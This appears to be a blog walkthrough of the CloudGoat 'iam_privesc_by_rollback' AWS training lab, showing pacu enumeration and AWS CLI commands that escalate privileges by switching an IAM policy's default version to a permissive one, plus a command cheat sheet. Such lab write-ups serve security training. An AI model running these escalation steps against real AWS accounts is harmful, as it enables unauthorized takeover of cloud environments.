---
title: "Cloudgoat IAM Privesc By Rollback"
date: 2025-06-12
draft: false
language: en
featured_image: ../assets/images/posts/iam_privesc_by_rollback_cloudgoat_challenge_logo.png
summary: A walkthrough of the IAM Privesc by Rollback easy Cloudgoat challenge
authorimage: ../assets/images/posts/cyber-immuno-fusion.png
categories: Blog
tags: ["AWS Pentesting", "IAM", "Cloudgoat"]
---
# Introduction & Context

Bonjour, c'est une write-up for the iam_privesc_by_rollback challenge from Cloudgoat available [here](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_key_rotation/README.md).This is a pretty quick and easy lab, where we just need to do some basic enumeration and switch a policy version. No flags or post-exploit work to do really, just search the environment and level up. I'll be providing my workflow, a bit of manual and a bit of automation with pacu, so follow along!

# Setup

If you haven't started the instance, run `cloudgoat create iam_privesc_by_rollback`. It'll load pretty quickly and give a pair of credentials. Add them using `aws configure --profile raynor` (or really any name doesn't matter) and use the region us-east-1 and format as json. Then just quickly verify they work by running `aws sts get-caller-identity --profile raynor`.

# Enumerate environment with pacu

To start off, I'm going to try and get a lay of the land by using [pacu](https://github.com/RhinoSecurityLabs/pacu) to do some of the initial enumeration. Run `pacu` to get it installed, then use `import_keys raynor` to load the credentials in. I'll do a quick run of the iam modules. Type `search iam` to get the modules about iam and the one of interest first is the profile persmission. After that, we can enumerate the environment for other users, roles, etc. Run these 2 commands:

```bash
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
```

You'll notice there are only 2 users, one is you and one is cloudgoat. Nothing useful there. The roles are all default ones. You can run `data iam` to get all the iam data, or filter by running something like `data iam TYPE` where TYPE is Users, Roles, Policies, Groups. The only half-useful thing is the one policy. Check it by running `data iam Policies`.

```json
[
  {
    "Arn": "arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x",
    "AttachmentCount": 1,
    "CreateDate": "Thu, 12 Jun 2025 17:21:39",
    "DefaultVersionId": "v1",
    "IsAttachable": true,
    "Path": "/",
    "PermissionsBoundaryUsageCount": 0,
    "PolicyId": "ANPAVRUVQNVQTRFKOIVZD",
    "PolicyName": "cg-raynor-policy-cgid77ggvan45x",
    "UpdateDate": "Thu, 12 Jun 2025 17:21:42"
  }
]
```

# Get policy details

Alright, let's look into that policy. This lab is about policy version control and right now it appears the default version is v1, which is what we have. To see what this policy on its version can do, run this: `aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v1 --profile raynor`.

So with this current version, we can do a few things on iam. We can get and list and fancy enough set a default policy version. With that, we can think of an attack path. If we find a policy version that has more permissions, we can set that version as the default and gain those privileges. To check other policies, just change the version number for the version id flag. The ones I ran were:

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v2 --profile raynor
aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v3 --profile raynor
aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v4 --profile raynor
aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v5 --profile raynor
aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v6 --profile raynor
```

I didn't myself, but if you want to check what versions exist, you could run `aws iam list-policy-versions --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --profile raynor` and confirm the number that exist. The last one appeared to be v6, but we would have found the juicy one well before that. Take a look at v3. That version lets you do anything on any resource.

# Escalate

To change the version now, its just one short command I had to lookup `aws iam set-default-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v3 --profile raynor`

And done! You now have complete access to the AWS environment.

# Conclusion

This was one of the shortest labs I've done on cloudgoat, I finished it under 15 minutes I think. All we had to do was quickly enumerate the environment, grab some policy details and change the version. A quick and easy lab teaching the importance of proper access controls. Never give user more permissions than they need!

*Don't forget to destroy your lab after!*

```bash
cloudgoat destroy iam_privesc_by_rollback
```

# Cheat Sheet

To close off, here's a quick summary of the commands we needed to run to complete this module. If you're ever coming back to this and just need that one command, this is the section to check.

```bash
#Start Up
cloudgoat create iam_privesc_by_rollback
aws configure --profile raynor

#Pacu our permissions
pacu
import_keys raynor
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
data iam Users
data iam Roles
data iam Policies
exit

#Get Policy Details
aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v1 --profile raynor
aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v3 --profile raynor

#List versions
aws iam list-policy-versions --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --profile raynor

#Escalate
aws iam set-default-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-raynor-policy-cgid77ggvan45x --version-id v3 --profile raynor

#Shutdown
cloudgoat destroy iam_privesc_by_rollback
```
